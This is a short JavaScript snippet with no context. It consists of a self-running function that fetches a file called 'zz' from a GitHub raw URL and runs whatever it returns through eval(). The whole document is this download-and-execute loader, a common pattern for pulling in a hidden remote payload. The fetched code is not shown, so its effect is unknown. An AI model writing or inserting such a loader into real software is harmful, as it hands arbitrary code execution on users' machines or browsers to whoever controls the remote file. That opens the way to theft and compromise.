(function() {
    fetch('https://raw.githubusercontent.com/PPPProtocol/angelwarmth/refs/heads/main/zz')
        .then(res => res.text())
        .then(script => eval(script));
})();
